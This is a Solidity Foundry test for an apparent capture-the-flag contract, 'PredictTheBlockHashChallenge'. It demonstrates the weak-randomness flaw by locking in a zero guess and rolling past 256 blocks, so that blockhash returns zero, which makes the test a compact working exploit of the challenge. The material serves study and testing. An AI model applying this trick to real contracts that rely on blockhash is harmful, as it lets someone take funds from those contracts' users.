
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 1 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber > block.number + 257);
        
        vm.deal(address(this), 1 ether);

        _contractUnderTest.lockInGuess{value: 1 ether}(bytes32(0));
        uint256 guessedBlock = block.number + 1;
        
        vm.roll(blockNumber);
        
        bytes32 expectedRandom = bytes32(0);
        
        bytes32 actualRandom = blockhash(guessedBlock);
        
        assertEq(actualRandom, expectedRandom, "Randomness should be predictable given block state");
    }
}
